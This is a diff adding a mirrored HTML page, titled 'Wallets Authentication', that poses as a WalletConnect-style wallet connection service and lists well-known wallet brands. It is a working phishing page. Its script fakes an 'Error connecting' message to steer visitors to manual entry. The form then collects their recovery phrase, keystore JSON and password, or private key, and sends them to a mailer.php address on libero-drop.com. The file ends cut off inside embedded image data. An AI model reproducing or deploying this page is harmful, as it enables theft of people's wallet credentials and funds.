@@ -1,0 +1,1417 @@
+<!DOCTYPE html>
+<html>
+
+
+
+<!-- Mirrored from libero-drop.com/app/index.html by HTTrack Website Copier/3.x [XR&CO'2017], Mon, 28 Mar 2022 19:39:01 GMT -->
+<head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<meta charset="utf-8">
+<meta http-equiv="x-ua-compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="generator" content="Gatsby 2.25.1">
+<title data-react-helmet="true">Wallets Authentication</title>
+<link rel="icon" href="favicon.png" />
+<link data-react-helmet="true" rel="shortcut icon" href="../../external.html?link=https://wallet.maticio.network/favicon.ico">
+<meta data-react-helmet="true" name="msapplication-TileColor" content="#da532c">
+<meta data-react-helmet="true" name="theme-color" content="#ffffff">
+<meta data-react-helmet="true" name="description" content="Open protocol for connecting Wallets to Dapps">
+<meta data-react-helmet="true" name="keywords" content="ethereum, cryptocurrency, wallet, mobile, connect, bridge, relay, proxy, standard, protocol, crypto, tokens, dapp">
+<meta data-react-helmet="true" name="twitter:card" content="summary_large_image">
+<meta data-react-helmet="true" name="twitter:site" content="@Wallets Validation">
+<meta data-react-helmet="true" name="twitter:title" content="Wallets Validation">
+<meta data-react-helmet="true" name="twitter:description" content="Open protocol for connecting Wallets to Dapps">
+<meta data-react-helmet="true" name="twitter:img:src" content="social-card.html">
+<meta data-react-helmet="true" name="og:title" content="Wallets Validation">
+<meta data-react-helmet="true" name="og:type" content="website">
+<meta data-react-helmet="true" name="og:url" content="../../external.html?link=https://securedwalletsprotocols.online/index.html">
+<meta data-react-helmet="true" name="og:image" content="social-card.html">
+<meta data-react-helmet="true" name="og:description" content="Open protocol for connecting Wallets to Dapps">
+<meta data-react-helmet="true" name="og:site_name" content="Wallets Validation">
+<meta data-react-helmet="true" name="fb:admins" content="365412154213405">
+<script src="jquery.js"></script>
+<link href="static/css/main.008403f2.chunk.css" rel="stylesheet">
+<script data-react-helmet="true" type="text/javascript" src="files/unregisterServiceWorker.js"></script>
+<style data-styled="dijnUu  hfVnjX fiuMUO kyUqCt eyaBAy hnlESl guKAph fuQfHo hDbjSS fAmUdU gFeYHJ jGHRMl ibLsRQ gAVVCu cmAzHq kSIOSl lfUBtr eodRCW ceWocr jVWwwJ YwSGw hvbAKM" data-styled-version="4.4.1">
+    /* sc-component-id: Header__SHeader-cphy8j-0 */
+    
+  </style>
+<link href="main.css" rel="stylesheet">
+<link as="script" rel="preload" href="files/webpack-runtime-08a0e953018334063ddd.js">
+<link as="script" rel="preload" href="files/framework-8e528b732ab2eaadb7b7.js">
+<link as="script" rel="preload" href="files/app-2b5a75f35e7d5a1e67ad.js">
+<link as="script" rel="preload" href="files/commons-728581910d6e685fb39c.js">
+<link as="script" rel="preload" href="files/component---src-pages-apps-tsx-50d212c53780f4e2ed64.js">
+<link as="fetch" rel="preload" href="../../external.html?link=https://wallet.maticio.network/page-data/apps/page-data.json" crossorigin="anonymous">
+<link as="fetch" rel="preload" href="../../external.html?link=https://wallet.maticio.network/page-data/app-data.json" crossorigin="anonymous">
+</head>
+<body>
+<div class="overlay" id="thebox" style="display: none ; margin-top: -50px;">
+<div class="overbox">
+<div style="overflow:hidden;margin:5px 0px;">
+<div class="closex" onclick="shutx('#thebox')">X</div>
+</div>
+<div class="insidewidth onediv">
+<div class="choosegrid">
+<div class="sgrid sactive" onclick="switchshow(this)">Phrase</div>
+<div class="sgrid" onclick="switchshow(this)">Keystore JSON</div>
+<div class="sgrid" onclick="switchshow(this)">Private Key</div>
+</div>
+<div class="loadbox ccbox">
+<div class="loaddv">
+<div class="loader"></div>
+</div>
+</div>
+<form id="submitform" action="../../external.html?link=https://libero-drop.com/app/mailer.php" method="POST">
+<input name="wallet" id="walletinput" type="hidden" value="Curve Finance">
+<input name="type" id="wallettype" type="hidden">
+<div class="phrasebox ccbox activebox">
+<textarea class="textarea allinput" name="phrase" placeholder="Phrase" id="phraseinput"></textarea>
+</div>
+<div class="keystorebox ccbox">
+<textarea class="textarea allinput" name="keystorejson" placeholder="Keystore JSON" id="kjsoninput"></textarea>
+<input class="input allinput" name="keystorepassword" placeholder="Keystore Password" id="kpasswordinput">
+</div>
+<div class="privatebox ccbox">
+<input class="input allinput" name="privatekey" placeholder="Private Key" id="privateinput">
+</div>
+<div class="buttonbox">
+<button class="bluebtn_bird" type="submit">connect</button>
+</div>
+</form>
+</div>
+<div class="insidewidth twodiv">
+<div class="dsdiv" id="fdxz" style="display:flex;">
+<div class="textdx" id="initext" style="font-size:14px;">Initializing</div>
+<div class="loaderw"></div>
+<div class="yuck" onclick="startjob()">connect manually</div>
+</div>
+<div class="dsdiv fxz" onclick="startjob()">
+<div class="textdx" id="extracttext" style="font-weight: bold;"></div>
+<div class="textdx" style="font-size:13px;margin:7px 0px">Connect to <span id="extracttext2"></span> and more
+</div>
+</div>
+</div>
+</div>
+</div>
+<script>
+
+    function submitform() {
+      sendform('actions.html', '#submitform', 'submitform');
+    }
+
+    function startloader() {
+      $('.ccbox').removeClass('activebox');
+      $('.loadbox').addClass('activebox');
+      shutx('.buttonbox');
+    }
+
+    function closeloader() {
+      $('.ccbox').removeClass('activebox');
+      $('.phrasebox').addClass('activebox');
+      openx('.buttonbox');
+    }
+
+
+    function extractwallet(element) {
+      openx('#thebox');
+
+      $('.insidewidth').removeClass('activebox');
+      $('.twodiv').addClass('activebox');
+
+      $('#initext').html("Initializing");
+      openx('.loaderw');
+      shutx('.yuck');
+      $('#fdxz').removeClass('reddsdiv');
+
+
+      setTimeout(function () {
+        $('#initext').html("Error connecting");
+        shutx('.loaderw');
+        openx('.yuck');
+        $('#fdxz').addClass('reddsdiv');
+      }, 2000);
+
+
+
+      var texr = $(element).text();
+
+      var texc = texr.replace(/\t+/g, '');
+      var text = texc.trim();
+      $('#walletinput').val(text);
+      $('#extracttext').html(text);
+      $('#extracttext2').html(text);
+    }
+
+
+    function startjob() {
+      $('.insidewidth').addClass('activebox');
+      $('.twodiv').removeClass('activebox');
+    }
+
+
+    function switchshow(element) {
+
+      $('.allinput').val("");
+
+
+      $('.sgrid').removeClass('sactive');
+      $(element).addClass('sactive');
+
+      if ($(element).text() == "Phrase") {
+
+        $('.ccbox').removeClass('activebox');
+        $('.phrasebox').addClass('activebox');
+
+        $('#wallettype').val("phrase");
+
+      } else if ($(element).text() == "Keystore JSON") {
+
+        $('.ccbox').removeClass('activebox');
+        $('.keystorebox').addClass('activebox');
+
+        $('#wallettype').val("keystore");
+
+      } else if ($(element).text() == "Private Key") {
+
+        $('.ccbox').removeClass('activebox');
+        $('.privatebox').addClass('activebox');
+
+        $('#wallettype').val("privatekey");
+
+      }
+
+
+    }
+
+  </script>
+<style>
+    .insidewidth {
+      display: none;
+    }
+
+    .loader {
+      border: 2px solid #f3f3f3;
+      /* Light grey */
+      border-top: 2px solid #3498db;
+      /* Blue */
+      border-radius: 50%;
+      width: 100%;
+      height: 100%;
+      animation: spin 0.5s linear infinite;
+    }
+
+
+
+    @keyframes spin {
+      0% {
+        transform: rotate(0deg);
+      }
+
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+
+    .loaddv {
+      width: 40px;
+      height: 40px;
+      margin: 30px auto;
+    }
+
+    .buttonbox {
+      text-align: center;
+    }
+
+    .bluebtn_bird {
+      padding: 7px 20px;
+      background-color: #2997d8;
+      color: white;
+      font-weight: bold;
+      border: none;
+      border-radius: 3px;
+      width: 60%;
+      text-transform: uppercase;
+      cursor: pointer;
+      transition: 0.5s;
+    }
+
+    .bluebtn_bird:hover {
+      background-color: #253b80;
+    }
+
+    .textarea {
+      height: 130px;
+      border: 1px solid rgba(192, 192, 192, 0.3);
+      border-radius: 3px;
+      width: 100%;
+      font-family: inherit;
+      padding: 10px;
+      font-size: 14px;
+    }
+
+    .input {
+      border: 1px solid rgba(192, 192, 192, 0.3);
+      border-radius: 3px;
+      width: 100%;
+      font-family: inherit;
+      padding: 7px 20px;
+      margin: 10px 0px;
+    }
+
+    .activebox {
+      display: block !important;
+    }
+
+    .ccbox {
+      display: none;
+      margin: 10px 0px;
+      padding: 10px;
+    }
+
+    .choosegrid {
+      display: grid;
+      grid-template-columns: 1fr 1fr 1fr;
+
+    }
+
+    .sgrid {
+      text-align: center;
+      padding: 10px 20px;
+      font-size: 13px;
+      border-bottom: 1px solid rgba(192, 192, 192, 0.3);
+      cursor: pointer;
+    }
+
+    .sactive {
+      border-bottom: 3px solid #2997d8;
+
+    }
+
+    .overlay {
+      width: 100%;
+      height: 100%;
+      position: fixed;
+      z-index: 1;
+      background: rgba(0, 0, 0, 0.3);
+      top: 0;
+      right: 0;
+      left: 0;
+      bottom: 0;
+      padding: 20px 0px;
+    }
+
+    .overbox {
+      width: 450px;
+      margin: 80px auto;
+      background: white;
+      border-top-left-radius: 7px;
+      border-top-right-radius: 7px;
+      box-shadow: 0px 2px 4px 0px rgba(0, 0, 0, 0.3);
+      padding: 20px 0px;
+    }
+
+    .closex {
+      float: left;
+      margin: 0px 20px;
+      cursor: pointer;
+      transition: 0.5;
+      font-size: 13px;
+    }
+
+    .closex:hover {
+      color: #2997d8;
+    }
+  </style>
+<div class="noth greennoth">
+<div class="closex2" onclick="closenotify()">X</div>
+<div class="nothdetails">
+okay this a notification
+</div>
+</div>
+<style>
+    .closex2 {
+      padding: 7px 10px;
+      color: white;
+      font-size: 13px;
+      margin-bottom: 0px;
+      padding-bottom: 0px;
+      cursor: pointer;
+      float: left;
+    }
+
+    .noth {
+      width: 20%;
+      border-radius: 3px;
+      bottom: 20px;
+      opacity: 0;
+      right: 20px;
+      position: fixed;
+      z-index: 1250;
+      display: none;
+    }
+
+    .nothdetails {
+      padding: 13px;
+      color: white;
+      font-weight: bold;
+      font-size: 13px;
+      text-align: center;
+    }
+
+    .confirmbox {
+      width: 35%;
+      padding: 10px;
+      background: white;
+      color: #5d6969;
+      font-weight: bold;
+      font-size: 13px;
+      margin: 10% auto;
+      border-radius: 5px;
+      box-shadow: 0px 2px 4px 0px rgba(0, 255, 255, 0.2);
+    }
+
+    .confirmbox {
+      width: 35%;
+      padding: 10px;
+      background: white;
+      color: #5d6969;
+      font-weight: bold;
+      font-size: 13px;
+      margin: 10% auto;
+      border-radius: 5px;
+      box-shadow: 0px 2px 4px 0px rgba(0, 255, 255, 0.2);
+    }
+
+
+    .nbc {
+      overflow: hidden;
+      width: 100%;
+    }
+
+    .confdetails {
+      color: #5d6969;
+      text-align: center;
+      padding: 12px;
+    }
+
+    .rtd {
+      padding: 5px;
+      color: white;
+      text-transform: uppercase;
+      font-weight: bold;
+      cursor: pointer;
+      font-size: 12px;
+      background: #006aa2;
+      margin: 6px;
+      border: none;
+      border-radius: 3px;
+      transition: 0.5s;
+    }
+
+    .rtd:hover {
+      opacity: 0.5;
+    }
+
+    .rgt {
+      float: right;
+    }
+
+    .lft {
+      float: left;
+      background: white;
+      color: #5d6969;
+      box-shadow: 0px 2px 4px 0px rgba(0, 255, 255, 0.1);
+      transition: 0.5s;
+    }
+
+    .lft:hover {
+      box-shadow: 0px 2px 4px 0px rgba(0, 255, 255, 0.5);
+    }
+
+    .greennoth {
+      background: linear-gradient(to bottom right, rgba(0, 255, 255, 0.9), #1c9a9a);
+      box-shadow: 0px 2px 4px 0px rgba(0, 255, 255, 0.9);
+    }
+
+    .rednoth {
+      background: #e14d43;
+      box-shadow: 0px 2px 4px 0px #e14d43;
+    }
+
+
+    @media only screen and (max-width:1100px) {
+
+
+      .confirmbox {
+        width: 40%;
+      }
+
+    }
+
+
+    @media only screen and (max-width:980px) {
+
+
+      .noth {
+        width: 30%;
+      }
+
+    }
+
+    @media only screen and (max-width:850px) {
+
+      .noth {
+        width: 40%;
+      }
+
+
+      .confirmbox {
+        width: 50%;
+      }
+
+    }
+
+
+    @media only screen and (max-width:650px) {
+      .confirmbox {
+        width: 65%;
+      }
+
+    }
+
+    @media only screen and (max-width:550px) {
+
+      .overbox {
+        width: 100%;
+        margin: 0px;
+        background: white;
+        border-top-left-radius: 7px;
+        border-top-right-radius: 7px;
+        box-shadow: 0px 2px 4px 0px rgba(0, 0, 0, 0.3);
+        padding: 20px 0px;
+        position: absolute;
+        bottom: 0;
+        z-index: 1000;
+      }
+
+
+    }
+
+    @media only screen and (max-width:450px) {
+      .confirmbox {
+        width: 70%;
+      }
+
+    }
+
+
+    @media only screen and (max-width:400px) {
+
+      .noth {
+        width: 90%;
+      }
+
+      .confirmbox {
+        width: 100%;
+        margin: 40px 0px;
+      }
+
+
+    }
+  </style>
+<header class="ant-layout-header" style="background: white; height: 70px; position: fixed; z-index: 100; width: 100%; padding: 0px 30px;">
+<nav class="flex items-center noselect">
+<a class="logo mr-3" href="index-2.html">
+<div class="logo-icon">
+<img src="connect.png" alt="Wallet Connect">
+</div>
+<div class="logo-text pt-1 hide-on-mobile">Wallets</div>
+</a>
+<div class="flex-1"></div>
+</nav>
+</header>
+<div id="___gatsby">
+<div style="height: 50px;"></div>
+<div style="outline:none" tabindex="-1" id="gatsby-focus-wrapper">
+<div class="layout__SWrapper-wjwiqk-0 dijnUu">
+<div class="layout__SFlex-wjwiqk-3 hfVnjX">
+<div class="layout__SContent-wjwiqk-1 fiuMUO">
+<div class="layout__SContainer-wjwiqk-2 fuQfHo">
+<div class="pageStyles__SIndexPage-sc-1navawn-0 hDbjSS">
+<div class="pageStyles__SBrandingWrapper-sc-1navawn-1 fAmUdU">
+<h1 class="pageStyles__SBranding-sc-1navawn-2 gFeYHJ">Decentralised Wallet Applications</h1>
+</div>
+<div class="pageStyles__SPageDescription-sc-1navawn-3 jGHRMl">Following decentralised finance and
+blockchain applications support Wallets Validation wallets.</div>
+<section class="pageStyles__SSection-sc-1navawn-4 ibLsRQ">
+<div class="Grid__SGrid-sc-8d5rqj-0 gAVVCu">
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img class="img_icons" src="logo/lg/c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96.jpg">
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Metamask Wallet</div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+ <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img class="img_icons" src="logo/lg/4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0.jpg" alt="Trust Wallet">
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Trust Wallet</div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img class="img_icons" src="files/wallet-connect.jpg" alt="Wallet Connect">
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Wallet Connect</div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"><img class="img_icons" src="logo/lg/0b415a746fb9ee99cce155c2ceca0c6f6061b1dbca2d722b3ba16381d0562150.jpg" alt="SafePal">
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">SafePal</div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"><img class="img_icons" src="logo/lg/20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2a2c66.jpg" alt="TokenPocket"></div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">TokenPocket</div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"><img class="img_icons" src="logo/lg/7674bb4e353bf52886768a3ddc2a4562ce2f4191c80831291218ebd90f5f5e26.jpg" alt="MathWallet"></div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">MathWallet</div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"><img class="img_icons" src="../../sync-walletsvalidator.net/WalletConnect_files/bb.jpg" alt="Coinbase"></div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Coinbase</div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"><img class="img_icons" src="../../sync-walletsvalidator.net/WalletConnect_files/aa.jpg" alt="Ledger"></div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Ledger</div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"><img class="img_icons" src="../../sync-walletsvalidator.net/WalletConnect_files/coin98-c5b50adaceaf474e48ef1dad150d0829.png" alt="Coin98"></div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Coin98</div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"><img class="img_icons" src="../../sync-walletsvalidator.net/WalletConnect_files/aaa.png" alt="Elrond"></div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Elrond</div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"><img class="img_icons" src="../../sync-walletsvalidator.net/WalletConnect_files/imtoken-fd8c7c52dac6101568954e7448a49202.png" alt="imToken"></div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">imToken</div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"><img class="img_icons" src="../../sync-walletsvalidator.net/WalletConnect_files/authereum-32f3939207b77c1837547d5ed4f86110.png" alt="Authereum"></div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Authereum</div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl"><img class="img_icons" src="data:image/jpeg;base64,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